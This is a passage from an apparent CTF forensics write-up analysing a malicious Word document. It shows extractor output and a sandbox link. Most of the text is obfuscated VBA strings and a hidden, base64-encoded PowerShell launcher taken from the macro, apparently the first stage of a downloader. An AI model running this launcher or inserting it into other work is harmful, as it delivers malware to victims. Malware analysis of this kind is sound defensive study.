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][(s)ce][(s)s][(s)win2_][(s)inmt][(s)P][(s)tar][(s)tu
+---------------------------------------------------------+
)]wPOwersheLL -windowstyle hidden -ENCOD              PAYKYzXpydxDfLrVDGutHywYTzdTuxuVavkeYugxmCkPrsgNMnlnWdIZbQjhfNhrVWCXpKbRkmOlbVyXqbYCqUcHXliVmLfaMgSWprNlQwkDlxbCfHtpKOmUXwLZQkYcUDRlCxFljFzFeRLTgUbegYIybKDWtFXatxHyneCtpOtuxdDLJFmgrDpywqHsvuDlSRRXcCExJWVIZRwrJLqqCGxPcugzWTAPvPAOaDagjFPugGYQbKMjHHAjMQDuLBXAjRZrIXzMhDhEDaVauNKZwsLcpYDiTCjXDSKjVxrJyCKTbxyQpStOtzVhkmpOFOSKrzpmdHqnHswxYAMUtAojIXFJPiqOIhCQuWCtbSKlTHpYtSKLJhqKgMenJrqPaVEaOAlfvuzoDElobDuuStmtoiiFBdBNovEkDhXBSwljhELNHgAxRQRchfGhcyJwaupagKXdYJqFfTRpnRaIUUBHEFUuoSNDGFYsYbwmNKhiEbpWkbKMvaIiqLhRAHiyGApyDRYadMZczehukCxBAYvxTOncycVzqHTFQLyPBgwEoDrcDYYUyhLmweKoOPKccGwkmgnzKOnffNlMGZrzkbuCHYUJywntWFXklGkYeHzzFDiRrcSsXfKxfEQEUATkzDOByMklrXHqfcvONshazqpdJMtXHFZuRaPcIKTstJqzRbDkqWgbWBurnEeMDqpmdyREsBAiLMYQCggpoINAbyLeCvshJFduFSRAsBEtHtspvLuyGQneKvyEcFnDFCfFjBVHCkAFqwFtKeywPyVlbYPjqPaOXhgKtGSrGWDLNmWfOmNHsMZAzIyBrqyXtxFghcJKOLVzeiptEqXAJPAVSrOeHAmuRoKbDqxUPpkcUjAMmPHbbkfiYDoSpFEygkCNxXhfdNYLdPthjLlEhvEPRXJJDzBuDXkZLAbhEacAkzDPzVVMFzVNZpGpfVXHccSseiixmIdBuRAXPIsvlEhjvYueBRkcFjuXiOupGiUPUiwBStQVlqNxlEDLwsGVGCMoSWKdTVfmAQtlVOkRodrfZEAmbPKGoGYjaUSFDnewcuwqZMrkuTGSkLBJRfAqkivfUBWctJPOuHXNYqLOUWyAgmyHzOAMKVwzkJODwvpzHAiYHJStgcgiQjpTrEHDGWiYTOnQkVkfgaoyfgyrqlTcTPzuhypKGJgDISZmKawalnrmyYQrlzkFIsmhBjRESGMbpxgkZhqKgopfqNcgIkshIDXuqWfPRJKLcCtFWgwTMeqIgWfhWMIaYGozfkVwTQsRuAfKKPJNlvTvluNPIYrVaEjlStjJUHGnNpYMAQsQlLWZsXEadAdZrOhdsstSyRaqwMTFGMpuTPvAXXAXQFoWVtFxoFQtLtpUfxFZmngivAxIXNzgsXEDHfpmDohZSbCdRKTtavBpomDFbzsEbLbvYphWmcygAhKUjInrbUOvYXrpyytMKRciwCpeIHYrLuODEJAXmOWsQAVcmQixtSAflEQBusmMKmZeiMUkvWeiRNcXPTGswYHJIaUzQxinmWJhkQBSytoBmwzYvBShaMoMSwfUExtbPcXkvfxvfFeoRPbeVttmWoKLxdQYJYkvdQDRaBtqtiejUMiBTQKYESaRBtxrszTNVUeBfLHLgtcGDJElHSRgnrXujZcvgZPzCdfGIjOlOJEBVgHotSrQnXJFtRNRkDYrmnoSCjOuznofszuDZhFJWAcChTDzRgmyqOwHleUTWbWsmRDcfamJqAEmZyIXzUvmjdBdSMKmRxRJnBXeemaXkTasILAFQgBUvqYHFCeENYplhYmoUadxFIiOwFFbdpHwEumzLUYkZQemPdHCogJMfTXmTGjCWkWgScrPNXsWZhDcTIwZCfysSsiTMERLclKWmoFcMehPMRHxBpnhLgKexAFsxrtDwmFZmHLHxxMiixUeMODpRyXOkAqhsWEDyWqudsDwXdIUKYSRiagOfICNevhzncVUrJeCHQKPcFhfnSAieTvbTjzlOoFDSOSmblnSCfRWguLkeEISVUyUCsnFBMBgyWPjmPnzjPxHIVityzxkYNrWauNwqOPgKgEOoHXPNpRHnWdFQIxQMUpmAmTIFSCuwdGupdsUCnxqvtPylHXRaGOZrooPcitLVzQJRCnknksBmqzOvcNNAzYGoPnyYPDwjiIWcSWxPATbzPWwSMbVepvQupaFySVXYSbxcGAJbVGDSZKqaCNUCXZuvNYanAIVGUkayrBwyiWPVhlQSsaoHofAEKwqUZMZlTaqDbUXdMCXwipYPTdoOffavWcPtbNWcIFUmzTZyNVvakHmhLrcWVlNxZuavFSLwpAbRSIZLyXZXZBPxrolWMdjmjWiiRzJDgKZyHcEKEXZzVSJRZtGAFKPysjicKtpxoywEWyspsXMcKpgukvCRkgOGMwbUBwZqWDwBLDZQoJWsoWqVNElkWitteJFSsjpBeeaEfBXDHaWwUyMnLBIUGbBpNIciFtvZQEblJCONBHpfhIWxXBWwpiTNPXcveMRMDDJoqnHLqdVJgauIcVMhDkCxpampHRElwmnBzbJnirBlWowrGJWCrLqhbYunQfUeRYmjCGKGUOmNmUAIRHCFkcLhIcaCQXydqvvEKtiqhXMSTZwtJuZKMiOMNMQJaZeVftukhxiBGtbJSuIuxEgZWBousxEMOUqGsgJgguGVUxtPaqHltjxNMMIpeQbycaSpalQmhXoytyDhiygoQbbzTPAdnZEWblkzHOxOnuaoDVtAMgKAHagnyduLIcvkPNxJqEvbHnSLLmXvpcPOiYmXJjyKyHmKKpytqnGudZxYQXyBEZDvOIGhSfGeqiEMfrkfncrTWaIASxBPeGLxZkMZQJyAlOiZVmpjKbXQbjtAOYccILcOBJAIEmtLKmueMXXwDqgllsDgiSlwStqfClLkiKKwpBTrcADCpylSSFdvJwQXkAfrNeCeaJWjRlsrzGQzyEXlnSLdOLLzqPDErmkPeGcVgLcyjVoQNRFOFLDPmSLAgbLPicRQtVXBiObvRJiSSKxmNaaIYQqSNaGIvrdbeENoKkNzEvOojJbJRPyfzQTXFaNXaIanruYaQLAxlTvOmtyHaIUYDwKPgtjwvEdZEeCtwuvkgkPLZOUyqjUNowgcWabimvCDIcDeTixyTWBYNZPxQhSBnMIBjvsfSDJvbWdkIWJzTVREzxdNKfcxCwvzYQHdGVTUNgrLLJuGxuPoElxonqJbpKNoRsSwSzLDukqsrOohWVpxJKlCZWZdAnCcWufbgUJCfGiJNHwZxkOHKctUsPGkhlhFyoIbAzhdgPEQWMzGCAveZknYBbpLHiZggRlwXMlybEgrvbZRDEbgdNBZPCoUIKOemRIcQVpBjjFHuwjthjwhPajrztYhCntEtYqZVPrchWVfyREqSVRmPSHdUDFTYTWPLImaVgWKBHRbiRqczwphuOFSBwdaAhHSOTfAYariDVtewRWjvkUhdmgDguHXpvSssNwcorjJYVEfNNLGGaATuAAbkUsbjmSASFHeNcalmcKOcrbewQBRPGFHVYQjKuukITpyghtDmeZFJgNcbuHSSTTiSEmTSHNAkXxajUBPhWjsxcrxmLROCBNHtxrQIcelFRkEfilGaSYBuUdTXrpUcyfRuTEBpUfgSgbUHEvlKbXPcFqWxFTDHfeaVTlkromwZuzYkJRNdIwmJZittkzQuPfFRdcudsDYgslesBZgfvMVaMHpBWYhfpbTtdOUldTKRDilyCLATgcPJgNZmjtkVGwiDxEPEsEjqmGAZeZKBHfFjboQKfNHuitgdLPDbxOcCfPHZnUlRtPRMnvHGghnVCsEklkpBQqVdBAxMMdHBDRfnvqzpIHeWWZaMkgJnpbVMxqySskhRspSYsUuyYVlVEizdCSURYsVBywjKzpsWsnOVzbEwNKBgwONBFzNyrsKYVwAseFyATmtRLHihvssQZbnNXCOYPkpBltuUsoYXJFepGXdzosGlzbmhxFHghuDBTtrOUAsOuAeVKskSXJaLHbDKIaHYaLvzJfBmtpuBQEUVbcscfybBYAjcrfQyQYyRDGUjCzlXlbfIzeDBAugJyPdwrwibpjAWZFDtrvHHGhPqKtLszbtfFMVVOyRRctXBssTXDcSHNWhnDFpqUdwzJYnwLgbQfSrRjFhdFqBXJqEopbgICtBDmEslzOpkhUyxmGteiXgJEufuujFhDGImlUyrvSZKHQRAnkZLYwcRTNNTPNbJOFVCXurrltWljtwipKmyGqvYaEksoiNNNvzizMaYtezXPEjxJmdSgIGnByrobpaLVTMWhUxMCoVTtPkgdpujRDhaBjgnpPUvfhoQBwLBfHSGPiYhSdIDAyMDVUUeVBBQkflBgtxsWGKkXOXLXgWHsUeMAKwrQbILeicvxqQQqrNWjNphURGWAJVPJWVcSSjCdNjAybrvXmiIFahZGwPyRIVKUqZFpFLkmHdyOgCifaLjnFaQZmPRyViraKKACsSnEYmfBwowGPHIicjcVbcoRpaCSVysYhYggIYEBJvUMvrKysRdRfvDmVtQktdVPbSxAdjnaIGJiBOnBuVPaEfLcpZrzenoZGGrtuSOPuHwoFHCodBDrwRZvyhPAUTWXaBvYgFuUHrrKrebVrVAHCMgoLHmAXSNaEVqZGAnzmzpLmKoDRMmZMNnayTsAajsLwchAwSlIAWxdRzWjbNzgTokywKWfWanJctmYAzSkgeclJuqfLhCTGPogbHubPpwiYIgNrRITVufKjFcPKbzhYAcIBGWBPWlwUywPxyismDwKJwFPdSyZFnkVlqgEXHMzDgQEmPPKDYYarMhKUDtFVsNJEsiRGNybnirPCJoWhcJKvOlRiDwBvPaxYJgtAbVIKgvzZcNuTYyPUeBSZtUBWazEvLMHBWihGAagkjKEEbgwLBYvfoQcVFgOVPCClvxgzEtFbDgAZFTaLtDMGqTzOsIPglPpClhozpfTkhwRjIIYJyBqWRBwAOlrbsmHiLVUiDKDowVqeLjSuuKhSRdoEvJOPerfQLRtRvCCXluHpSvfCFowLqxCUyqkFgsnOdQLvsUtqSYrgPYWIgSUZmXGZXwgMsOfcWGjMNtnFQacAargnPskTpUSNLAkkPyPRYErCEIFQggEgYHAmwyqzntSHODMZKeaDJnDJLLSHEsQcPJkhCYoCNAkiKdDUscFKWyxQEXiwsvGlJZQDnbZLnpaEhDwilbZGNpBbSTwbyjBNYPUqIIuJuzeXNNqXSfvLNSGPdDcLREILkdIfcIqNacahUHZwXwMpMyMJujyxJVybsGDMRZKCYbpGobUaUuDEpGrmOJPycUrzKYRJZxaDTQUDjalBsmEOJqFzYnRvijnMerXUPZFBFEmvaFhLcxtLxwwWQSCIGQqUFGMMgUEwjnAelDCghXbBjgJcJOyGBSUSXGlNKRHOIPQLzQeWqKQwjCQDzajYTPZVcJDNLIOhveNaEGfjSeqqfdKftNXRiuHsKrqqLdQwZXGfHggNCTMzXeUwNbZNHoNCIJhKqMzryeLqNLZweUxVLfgLrGBRFxPvJwpIMigeZRWywpzdZiGlgTFDsLZvJQkfdSmgzxyaNQvtvXdGuAfyttPnqIgsYylBmzNDdzStmaXhCOVKEhBqnPwgMOOYXLOkMXfejemrTQVYnAbwLKpzQfYKiVViilsqCsuhBGPRCMbaYzemeVdyTSeSfzbdpXvfaICEObthAmpaTLmXZUVHQltiIDUSqVvLjbKeGSXGjlgwuLLwzxFfjGileqXYYUrYBtPimRxgtQyiLxDyglDQqDeLXziRasdjuKBroXIvlxMeBsEeVyxanvctbjCgjTEDCvBxGvbkjUKCTwCUFCWRRBAvHQIsuSVTsAjdQujAUWbHNxBBLawBHqTZWTtXEujhaXRnauNifiuglPoGNyBmmidrZMcMGhWEGMiErhJkHGbBxtlqajXGNcyzOyNoExHkebDQDWyqTEYWgLWtMlXtGjgFDuzbaUbGhkymlYICRJdUKqjgrUkUiiJZiGtcNCAMsWLOxjDjtBwqelzlSvdBFHVRLvprEEkjsSUzlMXowCFduyfsMlzhADnzOVHJdmhogYuQXoToAOSguRGiZTsSAOjXublPWvaEnrTpDmnONsnkNlDNJtTTshXbJNtmiADPGBPecPvSedJkCqisrmscqXlwvortfrntRfyvRuXDfnvksrsufCFnNniAFPKNwcaXphQimmApuwFfNhBxOyjCnSJGmSCrBQiLfSdRKCVUDbgcNNqxykisinfhsneafIWUtqEnjxHJzqVpfCfTNrpYrLwNWfdQmsqBIaGdHJibCoygWRimwGBpFJwYJMOnqURhCpLaCSxhwUBMmVEmKaighXXlZYgJSKSfoRNaqihbsDkHdgqcjlemSIgnHzujxqpvDPfPtRuwqErLoyqlaNZPoRYWScXYjufCTjnRSnTyPGNvFswANbfrMfJwnBOyMZlQDNbWsrpcWEXWxFTMSajMGTzhMGudAOMzEvpDXwqsNyxuHCnLGdvrspZfBAISQIuQamtGOghvuUeVcuLRkcyflqUaqGdUpvEThtrjBRVkVDHOXlKZzuqNkkspicBRpkOyDjGdZxIfEaYjDcvdljSKVMtEobhgoNNwttComXFnZcShkCYxHlCVNtFDmsUYhUufuxeEzmmuIvSxYiihLkudkyFamwUefBnalTEijFYSTcEImPTPfnltffDaRWtpkbhQvJbwacujFbPawYJLUMxoAkxmJIZvORbfzpcGlAeOXEFYhDVbHpUQSYAPghCjrEcmrxHvBbxmFNnrnCYpTGiSqbRznrImUHXwXXIlIQMpbrVvkcPMkTrIBHAlGPcifHbnSrnGLvtfkwCSXhUhVJkyAJwZzDhVeMjruWmomRSsbxqYjYNnPHvIOCGqWEIXZOPfSLalnXTWgqcJaCfwNiCVGpPZOYqLbVBQdsAfDuxsTxozNitXiINaQIAMKJRdPXzmzdDyQUhVHfEbxBKkidXWFtijdoqvqdoPaSWmlNeOqeMbkhgkVQUaYyuxLgdTIyWYZMaLFKQKOVdSChkzEvTaUQUylJegyZqDlkFXPYWOxmxxwtSkZWoPdzrLCoaDVTKTMWNkxHXCIOagOMksevLBBdMiRhejdskfzsDFWnHXHDefjcrEVpfdgNqmaGtdtBnLPJtRAaSnOquhIbDNGGcFyVEsnczPnYKYuBmrCKpvpVoLOMYGJOJhlxUBYjpcCwylVrFnUwXYrAcwRRdaXbUwoWfXjPivyMSgmPKOkmJFJpyTDSCGdnKBNzrQKkYeSXJgdyLEJeBYxYVgpjSKGNbIieCkcQXqRksOvftddhNDefelYEgMXGHxYaIHeQmfsYDLehdIlQEIWBLTqFSopUjAKZpgRGHHwkEnsBTlCcyviHItOfEmZhHthjLsEjIlFFSUjneuwhWybyOuEsitjEkiQnTblDZMzqykyRtCBnDOcPvkeVvPMteXwuzbsbTEsrmfWNCVklOepYbUCKiwZMeIOycqXDcovjLPwVgucUNIqHzmlRVnsYnWJzhVSCpqIRqjIoRTDXvjTawMmrFxcCchtPmcmOVDpkcpVtyfwFnlOYPRrLcCNoLAfYonQAFNCqktlLwItRFUyhmANXNpvBpuouHPHjMXtklaIIYaTovrTUqtXPMfPyfPUfDrGcNjVKMSZTBtTvhPnsaEBYgQjcCEBlPQlBvwfgMTSAbRNDAysEOLAfSvKZOaWAiGGmnTCvHABocuVboAdzXdCmzVvJjmrHdvolKkjguEoSfNtWCgCYoNWFXOpNqNvLgUwanmrpTnEJeRFbeohvqZwOXuuneYaVsAEkVxUSBmuwMxoJqOSmtYVMnOwxBnzQfIJhUowAsqjINUvIgIGgsTsOxsByNXfxZohzIpApuJPrSEpeODrOceCVsvVlCzgQhbxWxYgOKIufClKDWdzkCzWnPHMEvJXBjpMrgKBsIoLgtPKKFGWneFvkUCvlsQoeoIwLkDLsNaXYUwygTOSRARssRjxamVFhyCNKuFEcTIDgmDGNyTNLxQlPCToRiVmpNVDbaWcSfIcMDoBAxHdIWfZOLsSNzivtYkafbplYBynuQYlmWmUExINcWZfZIhhjsdKbGzCuelillZPOcCtkNIOZJvZuwGBMMFBdLEYLgKHDljXuzbBzYbOucnNUbnZEtTlTqklcSuklYPvjzHPcSlBAiLycKpHShkiIwDVOiAHAxncivHYcXWrTfWsfSDoHxVbImqlUrHjzRuWdkTLAKItCtBcCuQQrouDWiZWsIewaerJWzwFsbdKhmJhYODeGHwtSNjcHMdyXYPqcDiCBszLljkSDHSBNwddgQayCvOJawljdeTlGcfPKwCObYumLcbFqGIMPlFZUJqBhWcKDofFgygiYgJzRRbQFJDLRfdryOCAgWoxKNUomXPbldsHNUfHrZHnmPOelEmdQfloMltBxysllNHUayunxECtdNFjPLOnpCQMHOxfzVWMQMnAwXjmWxxbDfPexuJIXglpQFzRprJuMNjdOfrFxvoGrhpEcVhDfAljRQsULTeSgsrlzLpBaXNFfFuKzVqXcOiOOmqExIYJlERkjiIUPonhIzCeunqSdCwXRAcoZscdBfKONgFurYlkJPjhPXItBoEPxYEFyDgmgpnUpRradUdUhCMrKXoPStGUIxGMOrtgZLNfWYvGbVFfnEqwgYlDUOFfHpgPfjKVPnOwMJcigDFXzyCGLMRAFsMEeepqSKWBJqflDFiCNNTUyDuXWJAnriGEuUBqcqonQOAgYBoBhineWnNlvhAeOIooFWeDarRehyyWdtlcQyEYbACPNTvHCVtLJUwOIMIDJRVUYHrovGIUfqewrHyFgWFdkvimouetDffdHtyekOzRuyGEBISgaHMnqpOBrvJedsouKzYLqYISuKYZqGKRgEKrlYraIdMmIYCVXygmJNgquCHDhTEYxxgbnwPnGmCzxDnPGqzBtNqznenCbfQyGPfhcpdvhzzieSyqOaelVGwiBEMdsfKiijFLZdDeGCiqACtWggmKUUtbLXFLQvNYtMEIskuIOtPNMDOKgkFVyVBVESYnteqQJZjkwJmZuGaINjhUnYipoZsavmEgVkTujXTZzVsTPVztjgStDGuYHUQxknOAxNmGYysaOaqdhHhaVECJVQNHBJJSlmMshoMMHiJCmtZrmOBUklpsuMvwZPBhZChZtLYYYxmeYVxSQpVIpneBmQeuzHVjWMwZsRegaglfBsWmdXJgElFDivSvHVfErZWeRWuopBMHELRLujNyoqi]()e[ss[swn_[sim]()]()a]()uINFO     Making dropped sample directory ...

+---------------------------------------------------------+

VBA Builtins Called: ['Chr', 'Create', 'CreateObject', 'Item', 'Len', 'Mid', 'Replace']

Finished analyzing /root/emo.doc .

  adding: root/emo.doc_artifacts/ (stored 0%)
[*] Dropped files are in emo.doc_artifacts.zip
[*] Done - Killing docker container b3865473732d8869dc0d84c14551f2f750c65ab4556d0938ecb749c4c8ff18b6
...
```

The given Base64 blobs didn't evaluate to anything...

Another approach would be to perform dynamic analysis with debugger, or submit the document on [https://app.any.run](https://app.any.run)

[https://app.any.run/tasks/564c32f0-1823-4a3c-bc85-0a6225ff789e](https://app.any.run/tasks/564c32f0-1823-4a3c-bc85-0a6225ff789e)

![emo.png](/assets/ctf/htb/forensics/emo.png)

```powershell
POwersheLL -windowstyle hidden -ENCOD IABTAFYAIAAgADAAegBYACAAKABbAFQAeQBQAGUAXQAoACIAewAyAH0AewAwAH0AewA0AH0AewAzAH0AewAxAH0AIgAtAGYAIAAnAGUAJwAsACcAcgBFAEMAdABvAHIAWQAnACwAJwBzAFkAcwB0ACcALAAnAC4ASQBPAC4AZABJACcALAAnAE0AJwApACAAIAApACAAOwAgACAAIABzAGUAdAAgACAAVAB4AHkAUwBlAG8AIAAgACgAIAAgAFsAVABZAHAAZQBdACgAIgB7ADAAfQB7ADcAfQB7ADUAfQB7ADYAfQB7ADQAfQB7ADIAfQB7ADEAfQB7ADgAfQB7ADMAfQAiAC0ARgAnAFMAWQBzAFQARQAnACwAJwBUAE0AJwAsACcASQBOACcALAAnAEUAUgAnACwAJwBwAE8AJwAsACcATgBlAFQALgBzAGUAJwAsACcAUgBWAEkAQwBFACcALAAnAE0ALgAnACwAJwBBAE4AYQBHACcAKQApACAAOwAgACAAJABOAGIAZgA1AHQAZwAzAD0AKAAnAEIAOQAnACsAJwB5AHAAJwArACgAJwA5ADAAJwArACcAcwAnACkAKQA7ACQAVgB4AG4AbAByAGUAMAA9ACQAQwBsAHUAZABrAGoAeAAgACsAIABbAGMAaABhAHIAXQAoADYANAApACAAKwAgACQAUgA2AHIAMQB0AHUAeQA7ACQASwB5ADMAcQAwAGUAOAA9ACgAKAAnAFIAcQAnACsAJwBkAHgAJwApACsAJwB3AG8AJwArACcANQAnACkAOwAgACAAKAAgACAARABpAHIAIAAgAHYAYQBSAGkAQQBiAGwAZQA6ADAAWgB4ACkALgB2AGEAbAB1AEUAOgA6ACIAQwByAGUAQQBUAGAARQBgAGQASQBSAEUAYwBgAFQAYABPAHIAWQAiACgAJABIAE8ATQBFACAAKwAgACgAKAAoACcAbgBEAHAAJwArACcASgByAGIAJwApACsAKAAnAGUAJwArACcAdgBrADQAbgAnACkAKwAnAEQAJwArACcAcAAnACsAKAAnAEMAJwArACcAYwB3AHIAXwAyAGgAJwApACsAJwBuAEQAJwArACcAcAAnACkAIAAtAFIAZQBQAGwAQQBjAEUAIAAoACcAbgAnACsAJwBEAHAAJwApACwAWwBj